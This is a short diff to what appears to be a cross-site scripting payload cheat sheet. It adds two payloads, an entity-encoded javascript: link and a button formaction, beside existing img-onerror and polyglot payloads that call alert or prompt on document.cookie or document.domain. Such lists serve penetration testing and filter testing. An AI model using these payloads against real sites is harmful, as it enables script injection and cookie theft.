@@ -9,6 +9,8 @@
 <img/src/onerror=prompt(8)>
 <img/src/onerror=alert(document.cookie;)>
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+This is important, please <a aa aaa href=j&#97v&#97script:&#97lert(document.domain)>ClickHere
+<form><button formaction=javascript&colon;alert(document.domain;)>CLICKME
 ```
 Without space:   
 ```
